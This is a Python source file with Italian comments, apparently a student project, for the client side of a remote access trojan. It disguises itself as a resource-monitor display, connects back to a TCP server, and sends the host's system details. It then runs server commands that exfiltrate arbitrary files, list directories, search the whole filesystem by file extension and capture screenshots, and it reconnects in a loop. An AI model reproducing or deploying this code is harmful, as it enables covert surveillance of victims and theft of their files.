import glob
import os
import pickle
import subprocess
import sys
from socket import *
import platform
import time
import psutil
import signal
from os import system
from threading import Timer
from traceback import print_exc
import pyautogui

IP = "localhost"
PORT = 8080  # Porta di Ascolto del TCP
ADDR = (IP, PORT)
SIZE = 4096
FORMAT = "utf-8"


# OK funzione di pulizia schermo per unix e windows
def clearScreen():
    if platform.system() == "Windows":
        system("cls")
    else:
        system("clear")


# OK gestisce il ctrl-C per l'uscita
def signalHandler(signum, frame):
    msg = "Uscita effettuata con successo"
    print(":", msg, end="", flush=True)
    exit(1)


# OK comportamento da trojan
def trojanBehaviour():
    while True:
        try:
            cpu = psutil.cpu_percent()
            ram = psutil.virtual_memory().percent
            disk = psutil.disk_usage("/").percent
            processes_count = 0
            print("\n\b\b\bRESOURCE MANAGEMENT SYSTEM\n")
            print("              --     Task manager: Current state of usage      --\n\n")
            # facciamo un display a video dell'utilizzo
            print("              --------------------------------------------------------- ")
            print("             | CPU USAGE | RAM USAGE | DISK USAGE | RUNNING PROCESSES |")
            print("             | {:02}%       | {:02}%       | {:02}%        | {:03}               |".format(int(cpu),
                                                                                                              int(ram),
                                                                                                              int(disk),
                                                                                                              processes_count))
            print("              --------------------------------------------------------- ")
            time.sleep(1)
            clearScreen()
        except:
            print("              --------------------------------------------------------- ")
            print("             | CPU USAGE | RAM USAGE | DISK USAGE | RUNNING PROCESSES |")
            print("              --------------------------------------------------------- ")


# OK creazione connessione
def clientConnection():
    try:
        client = socket(AF_INET, SOCK_STREAM)
        client.connect(ADDR)
        #print(f"[CONNECTED] Connessione avvenuta\n")
        return client
    except:
        #print(f"[ERROR] Connessione non riuscita: riprovo tra 10 secondi...\n")
        return "errore"


#  manda le informazioni base
def sendInfo(client):
    mando = 1
    while mando == 1:
        try:
            infos = "Operating System: " + platform.system() + "\nMachine: " + platform.machine() + "\nHost: " + platform.node() + "\nProcessor: " + platform.processor() + "\nPlatform: " + platform.platform() + "\nRelease: " + platform.release() + "\nPath: " + os.getcwd()
            client.send((str((len(infos)))).encode(FORMAT))
            time.sleep(2)
            client.send(((infos)).encode(FORMAT))
            mando = 0
        except Exception:
            mando = 0
            raise Exception


def filespath(tipologia, client):
    time.sleep(4)

    allType = ""
    listaType = tipologia.split()
    result = [""]
    path="null"
    counter_elemets=0

    if platform.system() == "Windows":
        path = "C:\\Users"
    elif platform.system() == "Darwin":
        path = "/Users/"
    else:
        path = "/"

    for n in range(len(listaType)):

        tipologia = listaType[n]
        result.append("\n\nLista dei risultati per estensione: " + tipologia + "\n\n")

        if tipologia == "*":
            allType=allType+" "+tipologia
            for cartella, sottocartelle, file in os.walk(path):
                for item in file:
                    result.append('"' + item + '"' + " nel percorso: " + cartella + "\n")

        elif tipologia[0:1]==".":
            allType=allType+" "+tipologia
            for cartella, sottocartelle, file in os.walk(path):
                for item in file:
                    if item.endswith(tipologia):
                        counter_elemets += 1
                        result.append('"' + item + '"' + " nel percorso: " + cartella + "\n")

    result.append("\n----Trovati "+str(counter_elemets)+" elementi.")
    result.append("\n### TROVATI TUTTI I FILE CON ESTENSIONE " + allType + "###\n\n")
    result = ''.join(result)

    try:
        filesize = sys.getsizeof(result)
        client.send((str(filesize)).encode(FORMAT))
        time.sleep(5)
        client.send((result).encode(FORMAT))

    except Exception:
        raise Exception

#cerco tutti i file con estensione indicata in un certo path
def find(comando, client):
    time.sleep(4)
    counter_punti=0
    counter_spazi=0
    inizio_ext=0
    fine_ext=0
    inizio_path=0
    counter_elemets=0
    specificlist = ["\nRisultati "+comando+":\n"]

    for element in range(0, len(comando)):
        if comando[element] == ".":
            counter_punti += 1
            if counter_punti == 1:
                inizio_ext = element
            elif counter_punti == 2:
                inizio_path = element
        if comando[element] == " ":
            counter_spazi += 1
            if counter_spazi == 2:
                fine_ext = element
                inizio_path = element + 1

    estensione=comando[inizio_ext:fine_ext]
    path=comando[inizio_path:]
    genericlist=os.listdir(path)
    for item in genericlist:
        if item.endswith(estensione):
            counter_elemets += 1
            specificlist.append("-: " + item + "\n")

    specificlist.append("\nNumero di elementi trovati: " + str(counter_elemets))
    data = ''.join(specificlist)

    try:
        filesize = sys.getsizeof(data)
        client.send((str(filesize)).encode(FORMAT))
        time.sleep(5)
        client.send((data).encode(FORMAT))
        time.sleep(1)
    except Exception:
        traceback.print_exc()
        raise Exception



# funzione di remote control
def openRemoteControl(client):
    comando = "null"
    while comando != "exit":
        try:
            pathSend="[PATH]"+os.getcwd()
            client.send((pathSend).encode(FORMAT))
            comando = client.recv(1024).decode(FORMAT)
            time.sleep(0.5)

            if comando[0:8] == "download":
                try:
                    filename = comando[10:len(comando) - 1]
                    filesize = os.path.getsize(filename)
                    with open(filename, 'rb') as f:
                        line = f.read(filesize)
                        client.send((str(filesize)).encode(FORMAT))
                        time.sleep(4)
                        client.send(line)
                        f.close()
                except:
                    client.send(("[ERROR]").encode(FORMAT))

                time.sleep(3)
            elif comando == "cd ..":
                os.chdir("..")

            elif comando == "cd":
                if comando[3:4] != "C" and comando[3:4] != "/":
                    path = comando[3:]
                    os.chdir(os.getcwd() + "/" + path)
                else:
                    os.chdir(comando[3:])



            elif comando[0:2] == "ls":

                if len(comando) == 2:

                    # ritorna una lista

                    listdir = os.listdir()

                    # faccio un dump per poterla inoltrare

                    data = pickle.dumps(listdir)

                    client.send(data)

                    time.sleep(1.5)

                else:

                    comandorisolto = comando.split()

                    path = comandorisolto[1]

                    listdir = os.listdir(path)

                    data = pickle.dumps(listdir)

                    client.send(data)

                    time.sleep(1.5)
                    
            elif comando == "pwd":
                client.send((os.getcwd()).encode(FORMAT))

            elif comando[0:9] == "filespath":
                estensione = comando[10:]
                try:
                    filespath(estensione, client)
                except:
                    pass

            elif comando[0:4] == "find" and len(comando)>4:
                try:
                    find(comando, client)
                    time.sleep(2)
                except:
                    traceback.print_exc()

            elif comando == "info":
                infos = "Operating System: " + platform.system() + "\nMachine: " + platform.machine() + "\nHost: " + platform.node() + "\nProcessor: " + platform.processor() + "\nPlatform: " + platform.platform() + "\nRelease: " + platform.release() + "\nPath: " + os.getcwd() + "\n"
                client.send(((infos)).encode(FORMAT))

            elif comando =="screenshot":
                myScreenshot = pyautogui.screenshot()
                if platform.system() == "Windows":
                    myScreenshot.save(os.getcwd() + "\screen.png")
                elif platform.system() == "Darwin":
                    myScreenshot.save(os.getcwd() + "/screen.png")
                else:
                    myScreenshot.save(os.getcwd() + "/screen.png")

                try:
                    filename = "screen.png"
                    filesize = os.path.getsize(filename)
                    with open(filename, 'rb') as f:
                        line = f.read(filesize)
                        client.send((str(filesize)).encode(FORMAT))
                        time.sleep(4)
                        client.send(line)
                        f.close()
                except:
                    pass

                os.remove("screen.png")

            else:
                pass

        except Exception as e:
            #traceback.print_exc()
            if e.__class__.__name__== "ConnectionResetError":
                comando="exit"
            else:
                comando="null"

def main():
    try:
        signal.signal(signal.SIGINT, signalHandler)
        client = clientConnection()
        client.setblocking(True)
        if client == "errore":
            raise Exception
        else:
            #print(f"[SENDING] Invio informazioni sul mio sistema al server\n")
            time.sleep(5)
            try:
                sendInfo(client)
            except Exception as e:
                raise e


            try:
                time.sleep(5)
                openRemoteControl(client)

            except Exception as e:
                if e.__class__.__name__ == "ConnectionResetError":
                    print(f"[CONNECTION INTERRUPTED] Connessione interrotta\n")
                    raise e
                raise e

            client.setblocking(False)
            client.send(1024)
            client.close()

    except Exception as e:
        if e.__class__.__name__ == "ConnectionResetError":
            #print(f"[CONNECTION INTERRUPTED] Connessione interrotta\n")
            raise e
        else:
            raise e

# start trojan
# thread_trojan=Thread(target=trojanBehaviour)
# thread_trojan.start()
# thead_remoteControl=Thread(target=remoteControl)


if __name__ == "__main__":

    while True:
        try:
            #print(f"[CONNECTION SEARCH] Sto cercando una connessione\n")
            main()
        except:
            #print(f"[RECONNECTION] Cerco un server a cui connettermi\n")
            time.sleep(5)
